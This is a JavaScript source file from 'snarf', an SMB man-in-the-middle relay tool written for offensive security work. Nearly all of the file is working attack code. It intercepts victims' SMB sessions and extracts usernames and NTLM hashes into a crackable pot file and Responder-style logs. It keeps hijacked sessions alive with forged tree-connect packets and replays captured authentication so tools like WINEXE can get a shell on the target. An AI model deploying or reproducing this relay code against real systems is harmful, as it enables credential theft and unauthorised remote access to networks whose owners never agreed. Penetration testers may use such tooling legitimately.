//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
//                    Victor Mata (victor@offense-in-depth.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var net = require("net");
var out = require("./out.js");
var smb = require("./smb.js");
var auth = require("./smbauth.js");

var Broker = require("./broker.js").Broker;

module.exports.SMBBroker = function(globals) {
    var timerID;
    this.super = Broker;
    this.super();

    this.port = function() { return 445 };

    this.inTransition = function() {
        return !this.authorizer.authenticated;
    }

    this.banner = function(sock1, sock2) {
        // sock1 == hacker
        // sock2 == middler
        out.blue("Authenticating hacker tool");
        var smb_userid = sock2.attributes.userid; // getSMBUserID();
        if(smb_userid) {
            this.authorizer = new auth.SMBAuth(sock1);
            this.authorizer.set_uid(smb_userid);
        } else {
            out.red("This middler never found a UID -- was it routed to itself?");
            sock1.end();
            return false;
        }
        return true;
    }

    this.reviewServerPacket = function(packet, client, middler) {
        if(packet.commandCode != 0x2b) {
            out.darkgreen("[" + middler.getID() + "] Server: " + packet.describe());
        }

        // this is the only tricky part here -- we don't ever want
        // to write to a closed socket, so we must trust other
        // sources of the "client" socket to set it to undefined
        // or false when closing.

        middler.freshen();
        // packet.buffer.writeUInt16LE(middler.oldpid, 0x1e);
        if(client) {
            if(packet.commandCode == 0x73) {

                // we need to record the UID set by the server
                // for authenticating the hacker tool properly
                var smb_userid = packet.buffer.readUInt16LE(32);
                middler.attributes.userid = smb_userid;
                // middler.setSMBUserID(smb_userid);
                out.yellow("Setting UID to " + smb_userid);

                //
                // there are two 0x73 packets sent by the server during negotiation.
                // we need to differentiate between the two in order to save the correct
                // server challenge. i found the following to be acceptable:
                //   negResult: accept-incomplete (1)
                //   negResult: accept-completed (0)
                // the offset was global on: Windows XP, Windows 7, Windows 2008

                // JJS -- I noticed that sometimes the negResult field
                // is not at 57 bytes in, but at 59 bytes.  I can't
                // see why by looking at the packets.  For now, this
                // seems to be not too dangerous...

                if((packet.buffer.length >= 59 && packet.buffer.readUInt8(59) == 0x01) ||
                   (packet.buffer.length >= 57 && packet.buffer.readUInt8(57) == 0x01)) {
                    out.blue("Running CredHunter(packet.buffer)");
                    var n = new smb.CredHunter(packet.buffer);
                    out.yellow("Setting Challenge to " + n.challenge);
                    middler.attributes.challenge = n.challenge;
                }
            }
            client.write(packet.buffer);
        } else {

            // Windows boxes drop SMB connections when there hasn't
            // been an open resource after 15 minutes (by default), so
            // we need to keep the session alive.  We can do this by
            // TREE_CONNECTing IPC$ and disconnecting it.  We set the
            // Process ID value to 0x1165 for these "pings" as a
            // marker so the broker can tell when it sees a tree
            // connect response that we need to close.  This sends the
            // TREE_DISCONNECT.

            if(packet.commandCode == 0x75) {
                if(packet.buffer.readUInt16LE(30) == 0x1165) {
                    var close  = new Buffer("00000023ff534d4271000000000801c8"+
                                            "00000000000000000000000004087910"+
                                            "00080500000000", "hex");
                    close.writeUInt16LE(packet.buffer.readUInt16LE(28), 28);
                    middler.getServer().write(close);
                }
            }
        }

    }

    this.reviewClientPacket = function(packet, server, middler) {
        middler.freshen();
        if(packet.commandCode == 0x73) {
            if(middler.getMature()) {
                // this shouldn't really happen... we shouldn't have
                // any 0x73s after the connection has matured and
                // we're jacking in hacking tools.  That said, it
                // happened a few times that the CredHunter ran and
                // populated invalid data, so we are trying to figure
                // out when this happens.  Thus, here is some debug
                // output in case we run into it again...

                out.red("DEBUG: got a command 0x73 (SESSION_SETUP_ANDX) in a mature Middler")
                out.red("DEBUG: Note, you're FINE... this connection has probably become unusable");
                out.red("DEBUG: but you haven't hurt a client, so it's not too bad.");
                out.red("DEBUG: Server:  " + server);
                out.red("DEBUG: Middler: " + middler);
                out.red("DEBUG: Packet:  " + packet.buffer);
            } else {
                var n = new smb.CredHunter(packet.buffer);
                out.red("Detected username: " + n.username);
                out.yellow("Hash: " + n.hash);

                middler.attributes.domain = n.domain;
                middler.attributes.username = n.username;
                middler.attributes.hostname = n.hostname;
                middler.attributes.winver = n.winver;
                middler.attributes.hash = n.hash;
                middler.attributes.hashtype = n.htype;

                // We received a request to record hashes in a file as
                // they come through.  I added this stuff to the
                // 'globals' and had to wire the smb broker so that it
                // receives a reference to globals.  In preliminary
                // testing, this seems to work well..

                var hashstring = this.getHash(middler);

                if(hashstring != "unknown") {
                    var userobj = n.domain + "\\" + n.username;
                    if(globals.hashes[userobj]) {
                        out.blue("Already recorded a hash for " + userobj);
                    } else {
                        out.blue("Writing hash for " + userobj + " to snarf.pot");
                        globals.hashfile.write(hashstring + "\n");
                        globals.hashes[userobj] = true;
                    }
                    // Keep this out of the above if-statement since we will want
                    // to save all hashes.
                    if(globals.responderhash) {
                        out.blue("Writing responder-style hash format");
                        globals.betaHash(middler.getClientAddr(), n.htype, hashstring + '\n');
                    }
                }

                // This turns out to be important -- if multiple inbound
                // connections come in to an SMB server with the "VC" flag
                // set to 0x0000, then the server will kill any previous
                // connections.  This happens regardless of username or
                // authentication method.  This is obviously uncomfortable
                // if we're going to be proxying sessions for lots of IPs.
                // If we set this to any non-zero value, this keeps the
                // sessions alive.  Amazing how hours of testing yields
                // only one line of code.  Accordingly, I thought I'd
                // accompany it with this mega-comment to further
                // legitimate my efforts.

                packet.buffer.writeUInt16LE(0x1, 45);
            }
        }
        if(packet.commandCode != 0x74) {

            // downgrade to "don't use extended security"; this
            // only works with XP clients and earlier

            // var flags = packet.buffer.readUInt16LE(14);
            // packet.buffer.writeUInt16LE(flags & 0xf7ff, 14);

            server.write(packet.buffer);
        } else {
            server.pause();
            middler.shutdown();
        }
    }

    this.transit = function(packet, sock, middler, server) {

        // We need to handle the "authentication" of the
        // hacking tool.  We can simply use copies of the
        // "real" responses we collected during the victim
        // snarfing stage.  In some cases, a tool may make
        // more than one connection.  This is fine, as
        // long as they are not simultaneous.

        this.authorizer.respond(packet.buffer);
    }

    this.parsePacket = function(x) {
        return new smb.SMBPacket(x);
    }

    // In the case of WINEXE, there are multiple
    // connections, and the third one makes WINEXE
    // hang until it closes for some reason.  This
    // closes it quickly so that the shell will
    // connect rather than timing out and taking a
    // long time.
    //
    // This should safely not bother other tools,
    // since WINEXE is the only one so far in testing
    // that keeps three concurrent sessions open.
    // Since in the 'end' listener above we reset
    // hackercount to 0, this should only be reached
    // by WINEXE or another tool that behaves
    // similarly.

    this.specialConditions = function(packet) {
        this.hackercount == 2 && packet.commandCode == 0x25
    }

    this.handleSpecials = function(sock) {
        sock.end();
    }

    // Once the client disconnects, we need to maintain the connection
    // between the server and target. We accomplish this by sending an
    // SMB Echo Request on a timed interval. Activation/deactivation is
    // mostly handled in the "listenForHackers" function.

    this.activateKeepAlive = function(middler) {
        out.yellow("Keepalive for middler");
        if(middler.attributes.userid) {
            middler.attributes.timerID = setInterval(function() {

                // SMB_ECHO_REQUEST packets don't keep the server alive --
                // there needs to be an open resource.  We can do this by
                // periodically connecting to the IPC$ tree and then
                // disconnecting.  This carrys out the TREE_CONNECT.  The
                // smbbroker takes care of closing the tree when the
                // response comes in (it needs to know the TreeID).

                packet = new Buffer("00000054ff534d4275000000001843c8" +
                                    "000000000000000000000000ffff6511" +
                                    "0010040004ff0000000c000100290000" +
                                    "5c005c003100320037002e0030002e00" +
                                    "30002e0031005c004900500043002400" +
                                    "00003f3f3f3f3f00", "hex");
                out.yellow("User id is " + middler.attributes.userid);
                packet.writeUInt16LE(middler.attributes.userid, 32);
                middler.getServer().write(packet);
            }, 12 * 60000); // every 12 minutes is a safe frequency
        } else {
            db.red("ERROR starting keepalive -- no userid was detected?");
            middler.attributes.timreID = null;
        }
    }

    this.deactivateKeepAlive = function(middler) {
        if(middler.attributes &&
           middler.attributes.timerID) {
            clearInterval(middler.attributes.timerID);
        }
    }

    this.getHash = function(m) {
        var hash = "unknown"
        switch(m.attributes.hashtype) {
        case "NTLMv1":
            hash = m.attributes.username + "::" + m.attributes.domain + ":" + m.attributes.hash + ":" + m.attributes.challenge;
            break;
        case "NTLMv2":
            hash = m.attributes.username + "::" + m.attributes.domain + ":" + m.attributes.challenge + ":" + m.attributes.hash;
            break;
        }
        return hash;
    }

    this.filterHackerPacket = function(packet) {
        var smbpacket = this.parsePacket(packet);
        var localhost = (new Buffer("5c005c004c004f00430041004c0048004f0053005400", "hex")).toString("utf8", 0, 22);
        var notlocals = (new Buffer("5c005c003100320037002e0030002e0030002e003100", "hex")).toString("utf8", 0, 22);
        if(smbpacket.commandCode == 0x75) {
            // If anyone tries to connect to an SMB service and
            // tree_connect to a share on "localhost", the server
            // will sometimes complain about a duplicate name on the
            // network.  So, when we do tree_connects, we want to
            // scrub any occurrence of "localhost".  The easiest
            // way to do this is just to change the string.
            var i = 0;
            for(i=0; i<smbpacket.buffer.length; i++) {
                var test = smbpacket.buffer.toString("utf8",i,i+22);
                if(test == localhost) {
                    out.red("Rewriting 'LOCALHOST' to '127.0.0.1'");
                    smbpacket.buffer.write(notlocals, i, 22);
                    break;
                }
            }
        }
        return smbpacket.buffer;
    }
}
